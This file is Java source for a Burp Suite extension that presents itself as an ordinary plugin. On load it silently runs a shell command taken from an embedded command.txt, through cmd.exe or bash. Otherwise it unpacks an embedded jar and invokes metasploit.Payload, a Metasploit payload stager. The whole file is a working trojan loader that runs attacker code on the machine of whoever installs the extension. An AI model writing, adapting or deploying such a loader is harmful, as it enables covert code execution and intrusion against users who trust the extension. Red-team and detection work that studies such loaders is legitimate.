package burp;

import java.io.File;
import java.io.InputStream;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;
import java.net.URL;
import java.net.URLClassLoader;
import java.lang.reflect.Method;

public class BurpExtender implements IBurpExtender {
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        // Read extension name from resource file and set it
        InputStream nameInputStream = getClass().getClassLoader().getResourceAsStream("name.txt");
        Scanner nameScanner = new Scanner(nameInputStream, StandardCharsets.UTF_8.name());
        String extensionName = nameScanner.useDelimiter("\\A").next().trim();
        callbacks.setExtensionName(extensionName);

        // Obtain our output and error streams
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
        PrintWriter stderr = new PrintWriter(callbacks.getStderr(), true);

        // Detect operating system
        String os = System.getProperty("os.name").toLowerCase();
        Process process;

        try {
            stdout.println("Initializing extension.");

            // Locate command.txt using ClassLoader
            InputStream commandInputStream = getClass().getClassLoader().getResourceAsStream("command.txt");

            if (commandInputStream != null) {
                // Read the command from command.txt
                Scanner commandScanner = new Scanner(commandInputStream, StandardCharsets.UTF_8.name());
                String command = commandScanner.useDelimiter("\\A").next().trim();

                if (os.contains("win")) {
                    // Create a temporary batch script to avoid line length issues from command line
                    File tempScript = File.createTempFile("command", ".bat");
                    tempScript.deleteOnExit(); // Ensure the file is deleted after execution

                    // Write the command to the script file
                    try (PrintWriter writer = new PrintWriter(tempScript, StandardCharsets.UTF_8.name())) {
                        writer.println("@echo off");
                        writer.println(command); // Write the payload command
                    }

                    // Execute the script file
                    process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", tempScript.getAbsolutePath()});
                } else {
                    // Unix-based systems: Use /bin/bash
                    process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", command});
                }
            } else {
                // Load burp_extension_pload.jar from resources
                InputStream jarInputStream = getClass().getClassLoader().getResourceAsStream("burp_extension_pload.jar");
                if (jarInputStream == null) {
                    throw new Exception("burp_extension_pload.jar not found in resources");
                }

                // Save the jar to a temporary file
                File tempJar = File.createTempFile("burp_extension_pload", ".jar");
                tempJar.deleteOnExit();

                try (InputStream inputStream = jarInputStream) { // Declare jarInputStream as a resource
                    java.nio.file.Files.copy(inputStream, tempJar.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                }

                // Load the jar using URLClassLoader
                stdout.println("Loading internal jar");
                try (URLClassLoader classLoader = new URLClassLoader(
                        new URL[]{tempJar.toURI().toURL()},
                        null // Use null for an isolated class loader
                )) {
                    Class<?> mainClass = classLoader.loadClass("metasploit.Payload");
                    Method mainMethod = mainClass.getDeclaredMethod("main", String[].class);
                    mainMethod.invoke(null, (Object) new String[]{});
                } catch (ClassNotFoundException e) {
                    stderr.println("Class not found: " + e.getMessage());
                } catch (NoSuchMethodException e) {
                    stderr.println("Main method not found: " + e.getMessage());
                } catch (Exception e) {
                    stderr.println("Error loading jar file (" + tempJar.toPath() + "): " + e.getMessage());
                    e.printStackTrace(stderr);
                }
            }

            stdout.println("Finished initializing extension.");
        } catch (Exception e) {
            stderr.println("Error loading extension: " + e.getMessage());
        }
    }
}
